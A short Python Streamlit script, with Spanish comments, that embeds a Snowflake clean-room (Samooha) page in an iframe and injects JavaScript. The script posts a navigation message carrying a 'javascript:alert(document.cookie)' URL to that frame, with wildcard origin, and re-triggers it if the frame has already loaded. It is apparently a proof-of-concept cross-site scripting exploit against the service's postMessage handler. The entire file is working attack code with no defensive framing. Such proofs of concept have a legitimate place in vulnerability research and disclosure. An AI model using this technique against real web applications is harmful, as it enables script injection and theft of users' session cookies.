import streamlit as st
import streamlit.components.v1 as components

st.title("Integración Samooha con postMessage")

st.iframe(
    "https://cleanroom.c1.us-east-1.aws.app.snowflake.com",
    height=600,
    alt="Streamlit documentation",
)
# Usamos components.html que SÍ permite la ejecución de JavaScript
components.html(
    """
    <!-- 2. Tu script se ejecuta aquí sin ser eliminado -->
    <script>
        const f = window.parent.document.querySelector('iframe');
        console.log(f)
        f.onload = () => {
            console.log("Iframe cargado internamente por JS, enviando postMessage...");
            f.contentWindow.postMessage({
              eventKey: "__SAMOOHA__NAVIGATE_TO_URL",
              data: { auth_url: "javascript:alert(document.cookie);void 0" }
            }, "*");
        };
        
        // Salvaguarda: Si el iframe ya cargó muy rápido antes de registrar el onload
        if (f.contentDocument && f.contentDocument.readyState === 'complete') {
            f.onload();
        }
    </script>
    """,
    height=600, # Ajusta la altura del componente contenedor de Streamlit
)
